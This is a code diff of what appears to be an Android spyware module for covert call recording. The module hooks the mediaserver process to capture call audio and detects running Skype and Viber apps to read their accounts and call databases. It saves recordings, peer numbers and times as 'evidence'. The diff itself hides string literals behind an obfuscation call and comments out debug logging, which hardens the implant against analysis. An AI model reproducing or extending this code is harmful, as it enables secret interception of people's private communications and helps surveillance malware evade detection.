@@ -232,7 +232,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		cb = new CallBack();
 		cb.register(new InternalCallBack());
 
-		hijack = new Instrument("mediaserver", AudioEncoder.getAudioStorage());
+		hijack = new Instrument(M.e("mediaserver"), AudioEncoder.getAudioStorage());
 
 		if (hijack.installHijacker()) {
 			if (Cfg.DEBUG) {
@@ -469,8 +469,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private boolean saveCallEvidence(String peer, String myNumber, boolean incoming, Date dateBegin, Date dateEnd,
 			String currentRecordFile, boolean autoClose, int channel, int programId) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (saveCallEvidence): " + currentRecordFile + " peer: " + peer + " from: " + dateBegin
-					+ " to: " + dateEnd + " incoming: " + incoming);
+			//Check.log(TAG + " (saveCallEvidence): " + currentRecordFile + " peer: " + peer + " from: " + dateBegin
+			//		+ " to: " + dateEnd + " incoming: " + incoming);
 		}
 
 		final byte[] additionaldata = getCallAdditionalData(peer, myNumber, incoming, new DateTime(dateBegin),
@@ -479,7 +479,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		AutoFile file = new AutoFile(currentRecordFile);
 		if (file.exists() && file.getSize() > HEADER_SIZE && file.canRead()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveCallEvidence): file size = " + file.getSize());
+				//Check.log(TAG + " (saveCallEvidence): file size = " + file.getSize());
 			}
 
 			int offset = 0;
@@ -487,7 +487,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 			if (ByteArray.equals(header, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (saveCallEvidence): AMR header");
+					//Check.log(TAG + " (saveCallEvidence): AMR header");
 				}
 				offset = AMR_HEADER.length;
 			}
@@ -500,8 +500,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveCallEvidence), data len: " + data.length + " pos: " + pos);
-				Check.log(TAG + " (saveCallEvidence), data[0:6]: " + ByteArray.byteArrayToHex(data).substring(0, 20));
+				//Check.log(TAG + " (saveCallEvidence), data len: " + data.length + " pos: " + pos);
+				//Check.log(TAG + " (saveCallEvidence), data[0:6]: " + ByteArray.byteArrayToHex(data).substring(0, 20));
 			}
 
 			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, data);
@@ -550,10 +550,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			pos += chunklen + 1;
 		}
 
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (checkIntegrity): end");
-		}
-
 		return pos;
 	}
 
@@ -598,8 +594,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		additionalData.write(callee);
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (getCallAdditionalData) caller: %s callee: %s", caller.length, callee.length);
-			Check.log(TAG + " getPosition: %s, len: %s ", additionalData.getPosition(), len);
+			//Check.log(TAG + " (getCallAdditionalData) caller: %s callee: %s", caller.length, callee.length);
+			//Check.log(TAG + " getPosition: %s, len: %s ", additionalData.getPosition(), len);
 		}
 
 		if (Cfg.DEBUG) {
@@ -926,9 +922,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		last_epoch = audioEncoder.getCallEndTime();
 
 		// Now rawPcm contains the raw data
-		String encodedFile = f + ".err";
+		String encodedFile = f + M.e(".err");
 
-		boolean remote = encodedFile.endsWith("-r.tmp.err");
+		boolean remote = encodedFile.endsWith(M.e("-r.tmp.err"));
 
 		if (!updateCallInfo(callInfo, false)) {
 			if (Cfg.DEBUG) {
@@ -1005,8 +1001,11 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			if (audioEncoder.isLastCallFinished()) {
 
 				finished[remote ? 1 : 0] = true;
-
-				if (finished[0] && finished[1]) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (encodeChunks) finished: [" + finished[0] + "," + finished[1] + "]" );
+				}
+				// || callInfo.programId == 0x0148  
+				if ( (finished[0] && finished[1]) ) {
 					// After encoding create the end of call marker
 					if (callInfo.delay) {
 						saveAllEvidences(chunks, begin, end);
@@ -1083,11 +1082,11 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		ListenerProcess lp = ListenerProcess.self();
 
-		if (lp.isRunning("com.skype.raider")) {
+		if (lp.isRunning(M.e("com.skype.raider"))) {
 			if (end) {
 				return true;
 			}
-			callInfo.processName = "com.skype.raider";
+			callInfo.processName = M.e("com.skype.raider");
 			// open DB
 			String account = ChatSkype.readAccount();
 			callInfo.account = account;
@@ -1103,9 +1102,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 
 			return ret;
-		} else if (lp.isRunning("com.viber.voip")) {
+		} else if (lp.isRunning(M.e("com.viber.voip"))) {
 			boolean ret = false;
-			callInfo.processName = "com.viber.voip";
+			callInfo.processName = M.e("com.viber.voip");
 			callInfo.delay = true;
 			callInfo.heur = true;
 			
@@ -1114,7 +1113,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			if (end) {
 				String account = ChatViber.readAccount();
 				callInfo.account = account;
-				GenericSqliteHelper helper = ChatViber.openViberDBHelper();
+				GenericSqliteHelper helper = ChatViber.openViberDBHelperCall();
 
 				if (helper != null) {
 					ret = ChatViber.getCurrentCall(helper, callInfo);
@@ -1124,8 +1123,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 					Check.log(TAG + " (updateCallInfo) id: " + callInfo.id);
 				}
 			} else {
-				callInfo.account = "delay";
-				callInfo.peer = "delay";
+				callInfo.account = M.e("delay");
+				callInfo.peer = M.e("delay");
 				ret = true;
 			}
 
